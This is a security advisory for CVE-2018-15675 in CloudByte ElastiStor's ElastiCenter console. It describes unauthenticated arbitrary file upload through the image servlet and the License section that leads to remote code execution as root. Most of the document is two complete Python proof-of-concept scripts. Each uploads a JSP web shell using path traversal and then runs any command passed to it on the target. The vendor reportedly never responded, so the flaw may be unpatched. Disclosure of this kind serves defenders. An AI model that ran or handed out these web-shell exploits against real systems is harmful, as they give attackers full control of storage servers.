**Vulnerability Summary**<br>
The following advisory describes two vulnerabilities found in ElastiCenter,
ElastiStor’s management console, File Injection that leads to unauthenticated remote code execution.
ElastiCenter is the centralized management tool that you use to configure, monitor, manage, and deploy the services provided by CloudByte ElastiStor.
ElastiCenter lets you:

* Use the Graphical User Interface to manage the storage environment
* Generate statistical and configuration reports to help troubleshoot
* Delegate administration tasks
* Track events
* Globally control various settings

**CVE**<br>
CVE-2018-15675

**Credit**<br>
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
CloudByte ElastiStor OS 2.1.0.1269

**Vendor Response**<br>
After several attempts to email CloudByte, we couldn’t get any response from the vendor.

**Vulnerability Details**<br>
ElastiCenter is vulnerable to unrestricted File Upload vulnerability found in “License” section and also in the image handling servlet. The purpose of the “License” is for administrative users to update the elasticenter license. Image handling servlet is responsible for image upload. Both sections have an upload functionality which could be accessed by unauthenticated remote attackers. Both sections allow to upload any file in any arbitrary location on the elasticenter host OS.
By uploading a JSP file to the server, an attacker can execute it in the server context (in this case “root” user).

**PoC**<br>
The first poc Injects JSP web-shell through the image handling servlet:
```python
#!/usr/bin/python
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
jspshell = """<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>
<%=output %>"""
print("ElastiStore Remote RCE PoC")
UPPATH = "/client/image"
if len(sys.argv) < 3:
    print("Usage :")
    print(sys.argv[0] + " <url_to_elasticenter> <cmd>")
    print(sys.argv[0] + " https://192.168.200.200/ \"uname -a\"")
    sys.exit(1)
s = requests.session()
xurl = sys.argv[1]
xcmd = sys.argv[2]
files = {'adminImage':("v1.jsp", jspshell), "adminType":"v1.jsp", "adminName":"../",}
g=s.post(xurl+UPPATH, data={}, files=files, verify=False)
resp = s.get(xurl+"/client/images/v1.jsp?cmd="+xcmd, verify=False)
print(resp.content)
```
Example run of poc1.py:

<img src="https://blogs.securiteam.com/wp-content/uploads/2018/08/poc1.png"><br>

The second poc Injects JSP web-shell through the “License” section:

```python
#!/usr/bin/python
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
jspshell = """<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>
<%=output %>"""
print "ElastiStore Remote RCE PoC 2"
UPPATH = "/client/license"
if len(sys.argv) < 3:
    print "Usage :"
    print sys.argv[0] + " <url_to_elasticenter> <cmd>"
    print sys.argv[0] + " https://192.168.200.200/ \"uname -a\""
    sys.exit(1)
xurl = sys.argv[1]
xcmd = sys.argv[2]
s = requests.session()
files = {'fileToUpload':("../../images/v2.jsp", jspshell ), "mainui":"mainui"}
g=s.post(xurl+UPPATH, data={}, files=files, verify=False)
resp = s.get(xurl+"/client/images/v2.jsp?cmd="+xcmd, verify=False)
print resp.content
```

On some latest linux versions ( debian/kali 2.0) you may run into ssl issues:
<img src="https://blogs.securiteam.com/wp-content/uploads/2018/08/poc2.png"><br>
In order to overcome this issue, run your favorite http proxy ( We use burpsuite on kali 2.0 )
Leave the defaults for burpsuit ( Listening on 127.0.0.1:8080 ), and set the proxy via the environment variables.

<img src="https://blogs.securiteam.com/wp-content/uploads/2018/08/poc3.png">
